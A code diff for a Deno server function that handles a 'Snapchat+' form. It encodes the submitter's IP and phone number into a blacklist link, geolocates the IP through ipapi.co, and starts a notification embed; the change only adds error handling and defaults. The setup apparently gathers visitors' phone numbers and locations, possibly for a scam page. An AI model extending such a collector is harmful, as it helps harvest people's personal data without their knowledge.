@@ -50,14 +50,21 @@ Deno.serve(async (req) => {
   const blacklistPayload = btoa(JSON.stringify({ ip, telephone, submissionId }));
   const blacklistUrl = `${appUrl}/api/blacklist?data=${blacklistPayload}`;
 
-  const geoResponse = await fetch("https://ipapi.co/" + ip + "/json/").catch(() => null);
-  let geoData = { country_name: "France", city: "Inconnue" };
-  if (geoResponse?.ok) {
-    geoData = await geoResponse.json();
+  let country = "France";
+  let city = "Inconnue";
+  
+  if (ip && ip !== "Inconnue") {
+    try {
+      const geoResponse = await fetch("https://ipapi.co/" + ip + "/json/");
+      if (geoResponse.ok) {
+        const geoData = await geoResponse.json();
+        country = geoData.country_name || "France";
+        city = geoData.city || "Inconnue";
+      }
+    } catch (e) {
+      // Fallback to defaults
+    }
   }
-
-  const country = geoData.country_name || "France";
-  const city = geoData.city || "Inconnue";
 
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
